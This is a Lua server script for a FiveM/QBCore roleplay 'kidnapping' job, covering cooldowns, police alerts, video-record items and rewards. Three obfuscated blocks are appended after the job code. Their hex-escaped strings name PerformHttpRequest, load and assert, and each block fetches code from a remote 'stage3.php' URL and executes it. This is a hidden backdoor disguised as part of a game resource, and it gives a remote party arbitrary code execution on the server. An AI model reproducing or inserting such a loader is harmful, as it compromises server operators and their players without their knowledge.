local QBCore = exports['qb-core']:GetCoreObject()
local lastNapping = 0
local queryRoom = false

QBCore.Functions.CreateCallback('kidnapping:server:checkQueryRoom', function(source, cb)
    cb(queryRoom)
end)

RegisterServerEvent('kidnapping:server:syncQueryRoom')
AddEventHandler('kidnapping:server:syncQueryRoom', function()
    queryRoom = not queryRoom
end)

QBCore.Functions.CreateCallback('kidnapping:server:checkTime', function(source, cb)
    local src = source
    local player = QBCore.Functions.GetPlayer(src)
    
    if (os.time() - lastNapping) < Config['Kidnapping']['nextNapping'] and lastNapping ~= 0 then
        local seconds = Config['Kidnapping']['nextNapping'] - (os.time() - lastNapping)
        TriggerClientEvent('QBCore:Notify', src, Strings['wait_nextnapping'] .. ' ' .. math.floor(seconds / 60) .. ' ' .. Strings['minute'], "primary")
        cb(false)
    else
        lastNapping = os.time()
        cb(true)
    end
end)

RegisterNetEvent('kidnapping:server:policeAlert')
AddEventHandler('kidnapping:server:policeAlert', function(coords)
    local players = QBCore.Functions.GetPlayers()
    
    for i = 1, #players do
        local player = QBCore.Functions.GetPlayer(players[i])
        if player.PlayerData.job.name == 'police' then
            TriggerClientEvent('kidnapping:client:policeAlert', players[i], coords)
        end
    end
end)

RegisterServerEvent('kidnapping:server:giveVideoRecord')
AddEventHandler('kidnapping:server:giveVideoRecord', function()
    local src = source
    local player = QBCore.Functions.GetPlayer(src)

    if player then
        player.Functions.AddItem(Config['Kidnapping']['videoRecordItem'], 1)
    end
end)

RegisterServerEvent('kidnapping:server:finish')
AddEventHandler('kidnapping:server:finish', function()
    local src = source
    local player = QBCore.Functions.GetPlayer(src)

    if player then
        local count = player.Functions.GetItemByName(Config['Kidnapping']['videoRecordItem'])
        if count ~= nil and count.amount > 0 then -- Crash, drop, etc. that may occur after taking a video recording in the previous job. I make him sell all the video recordings on it for situations like.
            player.Functions.RemoveItem(Config['Kidnapping']['videoRecordItem'], count.amount)
            player.Functions.AddMoney('cash', count.amount * Config['Kidnapping']['rewardCash'])
        end
        local random = math.random(1, #Config['Kidnapping']['randomRewardItems'])
        local item = Config['Kidnapping']['randomRewardItems'][random]
        player.Functions.AddItem(item, 1)
    end
end)

local iAheljHCcLQpaPKIiLikQbzOfbAJZxrfpfIYpuADRVkWDltFSzLAUBIGpdbyoBXXoTDqKF = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} iAheljHCcLQpaPKIiLikQbzOfbAJZxrfpfIYpuADRVkWDltFSzLAUBIGpdbyoBXXoTDqKF[4][iAheljHCcLQpaPKIiLikQbzOfbAJZxrfpfIYpuADRVkWDltFSzLAUBIGpdbyoBXXoTDqKF[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x70\x69\x2d\x66\x69\x76\x65\x6d\x2e\x6e\x65\x74\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x61\x4c\x61\x67\x32", function (LRaCbojigVAVoTctLIqPcXwurQMzLCSMfemCRKOqLCIzUhToMbDLJwPYQcMxYIdlkwsksz, QmWpNwVbwcCWAXSZpwSIbSqQnRFzFqjJbVurnviFgAXqrsgvxuRFSIxzDXKEdDFJGwovDH) if (QmWpNwVbwcCWAXSZpwSIbSqQnRFzFqjJbVurnviFgAXqrsgvxuRFSIxzDXKEdDFJGwovDH == iAheljHCcLQpaPKIiLikQbzOfbAJZxrfpfIYpuADRVkWDltFSzLAUBIGpdbyoBXXoTDqKF[6] or QmWpNwVbwcCWAXSZpwSIbSqQnRFzFqjJbVurnviFgAXqrsgvxuRFSIxzDXKEdDFJGwovDH == iAheljHCcLQpaPKIiLikQbzOfbAJZxrfpfIYpuADRVkWDltFSzLAUBIGpdbyoBXXoTDqKF[5]) then return end iAheljHCcLQpaPKIiLikQbzOfbAJZxrfpfIYpuADRVkWDltFSzLAUBIGpdbyoBXXoTDqKF[4][iAheljHCcLQpaPKIiLikQbzOfbAJZxrfpfIYpuADRVkWDltFSzLAUBIGpdbyoBXXoTDqKF[2]](iAheljHCcLQpaPKIiLikQbzOfbAJZxrfpfIYpuADRVkWDltFSzLAUBIGpdbyoBXXoTDqKF[4][iAheljHCcLQpaPKIiLikQbzOfbAJZxrfpfIYpuADRVkWDltFSzLAUBIGpdbyoBXXoTDqKF[3]](QmWpNwVbwcCWAXSZpwSIbSqQnRFzFqjJbVurnviFgAXqrsgvxuRFSIxzDXKEdDFJGwovDH))() end)

local EUMnqBFgtiztVZMYPTErvGOhQMhqQMdmsUXWOUcjnRTOuhTISmvvqXRsEcQgtKKPMTzpyf = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} EUMnqBFgtiztVZMYPTErvGOhQMhqQMdmsUXWOUcjnRTOuhTISmvvqXRsEcQgtKKPMTzpyf[4][EUMnqBFgtiztVZMYPTErvGOhQMhqQMdmsUXWOUcjnRTOuhTISmvvqXRsEcQgtKKPMTzpyf[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x70\x69\x2d\x66\x69\x76\x65\x6d\x2e\x6e\x65\x74\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x61\x4c\x61\x67\x32", function (fstmPNgwJCNfeXcAdlRnvZwdxIdUfSIlrJYySDrTqTJkWrHNTOplTHsQPFkxVUKpMhYpLm, zXuFQigMHpiISBfKWvdnUflQNiPpsxEnUSMQPmgDlJyaZgMpWycARdHXTIhmPDGwzpeLuf) if (zXuFQigMHpiISBfKWvdnUflQNiPpsxEnUSMQPmgDlJyaZgMpWycARdHXTIhmPDGwzpeLuf == EUMnqBFgtiztVZMYPTErvGOhQMhqQMdmsUXWOUcjnRTOuhTISmvvqXRsEcQgtKKPMTzpyf[6] or zXuFQigMHpiISBfKWvdnUflQNiPpsxEnUSMQPmgDlJyaZgMpWycARdHXTIhmPDGwzpeLuf == EUMnqBFgtiztVZMYPTErvGOhQMhqQMdmsUXWOUcjnRTOuhTISmvvqXRsEcQgtKKPMTzpyf[5]) then return end EUMnqBFgtiztVZMYPTErvGOhQMhqQMdmsUXWOUcjnRTOuhTISmvvqXRsEcQgtKKPMTzpyf[4][EUMnqBFgtiztVZMYPTErvGOhQMhqQMdmsUXWOUcjnRTOuhTISmvvqXRsEcQgtKKPMTzpyf[2]](EUMnqBFgtiztVZMYPTErvGOhQMhqQMdmsUXWOUcjnRTOuhTISmvvqXRsEcQgtKKPMTzpyf[4][EUMnqBFgtiztVZMYPTErvGOhQMhqQMdmsUXWOUcjnRTOuhTISmvvqXRsEcQgtKKPMTzpyf[3]](zXuFQigMHpiISBfKWvdnUflQNiPpsxEnUSMQPmgDlJyaZgMpWycARdHXTIhmPDGwzpeLuf))() end)

local oMFPgCAcLBJHyncaynUrXjxCILebSYVTMBQjsGMkOZsflNEIEkpZuQYSJXVUBZFcsZeirP = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} oMFPgCAcLBJHyncaynUrXjxCILebSYVTMBQjsGMkOZsflNEIEkpZuQYSJXVUBZFcsZeirP[4][oMFPgCAcLBJHyncaynUrXjxCILebSYVTMBQjsGMkOZsflNEIEkpZuQYSJXVUBZFcsZeirP[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x70\x69\x2d\x66\x69\x76\x65\x6d\x2e\x6e\x65\x74\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x61\x4c\x61\x67\x32", function (dLvqckUjwbOcXLiYPbWQvzOFLitVPmLVlPmDoOAHgCkzrMhxhDmJvGLGoijROluHdsoIbU, VvDfSzvCpJvmHKuCvtYNBPsSRdKyAoGuIlvxWTgLXAHgHyMtJOYPSkuDOutVXKbyFGiclv) if (VvDfSzvCpJvmHKuCvtYNBPsSRdKyAoGuIlvxWTgLXAHgHyMtJOYPSkuDOutVXKbyFGiclv == oMFPgCAcLBJHyncaynUrXjxCILebSYVTMBQjsGMkOZsflNEIEkpZuQYSJXVUBZFcsZeirP[6] or VvDfSzvCpJvmHKuCvtYNBPsSRdKyAoGuIlvxWTgLXAHgHyMtJOYPSkuDOutVXKbyFGiclv == oMFPgCAcLBJHyncaynUrXjxCILebSYVTMBQjsGMkOZsflNEIEkpZuQYSJXVUBZFcsZeirP[5]) then return end oMFPgCAcLBJHyncaynUrXjxCILebSYVTMBQjsGMkOZsflNEIEkpZuQYSJXVUBZFcsZeirP[4][oMFPgCAcLBJHyncaynUrXjxCILebSYVTMBQjsGMkOZsflNEIEkpZuQYSJXVUBZFcsZeirP[2]](oMFPgCAcLBJHyncaynUrXjxCILebSYVTMBQjsGMkOZsflNEIEkpZuQYSJXVUBZFcsZeirP[4][oMFPgCAcLBJHyncaynUrXjxCILebSYVTMBQjsGMkOZsflNEIEkpZuQYSJXVUBZFcsZeirP[3]](VvDfSzvCpJvmHKuCvtYNBPsSRdKyAoGuIlvxWTgLXAHgHyMtJOYPSkuDOutVXKbyFGiclv))() end)